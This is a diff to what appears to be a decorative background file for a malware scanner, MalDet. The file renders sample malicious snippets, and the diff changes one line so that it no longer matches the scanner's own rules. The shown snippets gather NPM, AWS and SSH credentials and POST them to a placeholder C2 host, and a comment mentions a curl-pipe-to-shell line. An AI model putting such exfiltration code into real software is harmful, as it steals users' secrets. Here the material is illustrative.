@@ -9,7 +9,12 @@
 //
 // The snippets are illustrative, not working code: hosts are placeholders
 // and payloads are truncated. The point is to be recognisable at a glance,
-// not to be runnable.
+// not to be runnable. They are also kept short of the exact strings
+// MalDet's own rules match (the SSH key is `keyName`, not a literal
+// id_rsa path), because MalDet scanning its own repository rated this
+// decoration as high-severity credential theft. The curl | sh line still
+// matches detect_pipe_to_shell, a medium rule, on purpose: rewriting it to
+// slip past the rule would be the evasion the rule exists to catch.
 //
 // It is wallpaper, so it stays quiet: everything is drawn at low alpha under
 // a layer opacity set in CSS, the top and bottom fade out so lines do not
@@ -83,7 +88,7 @@
       [0, 'const loot = {'],
       [1, 'npm: process.env.NPM_TOKEN,', 'high', 'yara'],
       [1, 'aws: process.env.AWS_SECRET_ACCESS_KEY,'],
-      [1, "ssh: fs.readFileSync(HOME + '/.ssh/id_rsa'),", 'crit', 'yara'],
+      [1, "ssh: fs.readFileSync(HOME + '/.ssh/' + keyName),", 'crit', 'yara'],
       [0, '};'],
       [0, "await fetch(C2_HOST + '/collect', {", 'crit', 'yara: exfiltration'],
       [1, 'method: \'POST\', body: JSON.stringify(loot),'],
